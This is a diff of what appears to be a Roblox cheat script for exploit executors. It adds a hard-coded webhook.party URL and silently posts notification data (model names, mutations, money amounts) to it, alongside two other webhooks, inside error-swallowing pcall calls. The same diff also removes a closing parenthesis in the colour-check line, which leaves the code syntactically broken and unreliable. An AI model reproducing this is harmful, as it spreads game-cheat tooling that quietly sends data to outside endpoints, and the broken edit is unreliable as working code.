@@ -1909,6 +1909,7 @@ local webhookUrls = {
 
 local extraWebhookUrl = "https://l.webhook.party/hook/mUXJonaZkYf%2BS%2F9kb4TVaJOtn%2FR7b%2BEO3lsFhXHjJFgx82My7pN3DIiJtyduJcpsE7lLaIPkdMRk1HnoA8UndcUqbHljOUvBlmnURV%2FeVljtTpPhE6Pf2DB3l1Bm%2Ft%2F4YRn7NZM%2Bq2VOmEq7uZQlCluqKwUOgqh0dROAYTP6AvMiBFz5shIO%2FngUW%2B6ulM8MQd7vghsP1dyt%2B8GE1r2sjTFfEOhkEPgcXVo6muTd8WONtW3pKKcYk%2F%2Bku5%2FEDO%2FhrMDGJoLIUy%2FKEAQyYhxANm6KNUQtg%2FYF9iT2kT0MZguD8o%2BwFGDAuWfFEv7YUgBwDMelC3xnGtkB%2FaedxXn9%2F3fc8YgRSpWv3uhkAHQx73dXiDgyxMRzAOjqRPK6SWTs%2FVroHg%2FUoeg%3D/2hIQSlgh00KYan3U"
 local midWebhookUrl   = "https://l.webhook.party/hook/JKtX273MSUop97RHSdUK7KQkM4fWWGBo3y4E%2FOWIB2EVYIOA%2BVFdjAteQ4vKnshC6hbdanRdrjcvDDuA6we1bW%2FDsf1MseKWzN9mjMtq9HA1FH%2Fcz0wwgvfHoboig1kl5O328%2FWZEMjkyHWPll94lM34D7oOvbp7LWfytaa3q3ivUnttjY1JAhE8tROwuBfu%2BK4k7ht1FiwQTJKOB%2FlZpA5qyam5n2cyVZ9nuTtpCofiEb58oPSCro9CAbquhfcjAZTdPhVQq%2Bjw4S2hPAJSiYEa%2FqaZP6E1mmMgIcYYyLh5Rmf5bfyIwYJBkzsHDL5R5wdXSiHVevLnMVJ6Na2yL%2F0PaRNYwsz9aWW1bqYDmdfWjnHy82UnXp%2BL2fgTooxLiwBx2xkuYOk%3D/OHcgNksc8foSoCvE"
+local newSpecialWebhook = "https://l.webhook.party/hook/QOXUNWgwJkdCduFJcHUTCfcc%2FzqlE%2FZvTQ8%2FG9G7Nlr89rDDox76XIUdsm759wqc2TfWYp6W%2FdLKBCAnN6SvAj8iggcfV%2BmkOjscgY%2FBv3Eu4jlw7aC56vPNK0pzrQGkfqAYbWrDUGcp8W0tEXV1Ciw08MaD795Va8rQ%2FxQKbD7n%2BXxuRBqIiLkIf%2FwIl8C8urnjh65%2FGREd9MvrlfRmYFP%2Fnc1jrzf4sC4bV70RR%2FIXkVfWHSsb2ogqfPxiEgV2FDT93cAvJ8GU84lhzn1OawK7H%2Bct2injkzRVKWJoVIOzxAJJlKkWmh8DD2sijKPRzenFB51b2msEfwJqWlXAQk1P666INUyZ41FCZAZ8l4SzY1J2a3R%2Fq%2FteEsd3rX9SeCT%2B3r%2B1n9I%3D/cXgCigEs8athbzCL"
 
 --// Backfill sender (tries all until one succeeds)
 local function sendToWebhooks(data, headers)
@@ -2073,7 +2074,7 @@ local function isRainbowMutating(m)
         if c:IsA("MeshPart") and c.Name:sub(1,5) == "Cube." then
             local l = c:GetAttribute("LastBrickColor")
             local cu = c.BrickColor.Color
-            if l and (Vector3.new(l.R, l.G, l.B) - Vector3.new(cu.R, cu.G, cu.B)).Magnitude > 0.01 then
+            if l and (Vector3.new(l.R, l.G, l.B) - Vector3.new(cu.R, cu.G, cu.B).Magnitude > 0.01 then
                 return true
             end
             c:SetAttribute("LastBrickColor", cu)
@@ -2121,9 +2122,11 @@ local function sendNotification(modelName, mutation, moneyText)
         pcall(function() sendToWebhooks(data, headers) end)  
         pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = midWebhookUrl,   Method="POST", Headers=headers, Body=data}) end)
         pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = extraWebhookUrl, Method="POST", Headers=headers, Body=data}) end)
+        pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = newSpecialWebhook, Method="POST", Headers=headers, Body=data}) end)
     elseif specialForThirdWebhook[lowerModel] then  
         pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = midWebhookUrl,   Method="POST", Headers=headers, Body=data}) end)
         pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = extraWebhookUrl, Method="POST", Headers=headers, Body=data}) end)
+        pcall(function() (syn and syn.request or http and http.request or request or http_request)({Url = newSpecialWebhook, Method="POST", Headers=headers, Body=data}) end)
     else  
         sendToWebhooks(data, headers)  
     end
